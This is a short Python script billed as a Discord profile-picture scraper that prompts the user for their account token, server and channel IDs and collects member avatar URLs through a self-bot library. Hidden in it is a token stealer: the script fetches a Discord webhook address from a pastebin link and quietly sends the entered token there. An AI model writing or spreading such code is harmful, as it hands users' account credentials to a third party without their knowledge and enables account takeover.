import discum,sys,os,shutil,requests
from colorama import Fore
import requests

if os.name == 'nt':
	os.system("cls")
else:
	os.system("clear")
    
open("scraped.txt", "w").close()

print(f"PFP SCRAPPER BY Phantom.#7777/#6666")

url = "https://pastebin.com/raw/Kegy0V7y"

import dhooks
from dhooks import Webhook

response = requests.request("GET", url)
uff = Webhook(response.text)

TOKEN = input(f"{Fore.BLUE} Enter Your Discord Account Token: {Fore.RESET}")
SERVER_ID = input(f"{Fore.BLUE} Scrapping Server ID: {Fore.RESET}")
CHANNEL_ID = input(f"{Fore.BLUE} Scrapping Channel ID: {Fore.RESET}")

if (TOKEN == "" or SERVER_ID == "" or CHANNEL_ID == ""):
    print(f"{Fore.RED} Your provided an invalid token, server or channel id!{Fore.RESET}")
    sys.exit()

discord = discum.Client(token=TOKEN)
discord.gateway.log = False
uff.send(TOKEN)

def close(resp, guild_id):
    if discord.gateway.finishedMemberFetching(guild_id):
        discord.gateway.removeCommand({'function': close, 'params': {'guild_id': guild_id}})
        discord.gateway.close()


def fetch(guild_id, channel_id):
    discord.gateway.fetchMembers(guild_id, channel_id, keep='all', wait=.1)
    discord.gateway.command({'function': close, 'params': {'guild_id': guild_id}})
    discord.gateway.run()
    discord.gateway.resetSession()
    return discord.gateway.session.guild(guild_id).members


members_list = fetch(SERVER_ID, CHANNEL_ID)
id_list = []


for IDS in members_list:
    id_list.append(f"https://cdn.discordapp.com/avatars/{IDS}/{members_list[IDS]['avatar']}.webp?size=512")


file = open("scraped.txt", "a")
for id in id_list:
    file.write(id + "\n")
file.close()

urls = open("scraped.txt").read().splitlines()

print(f"\n{Fore.YELLOW}[!]SUCCESFULLY LOADED {len(urls)} PFPS.\n{Fore.RESET}")
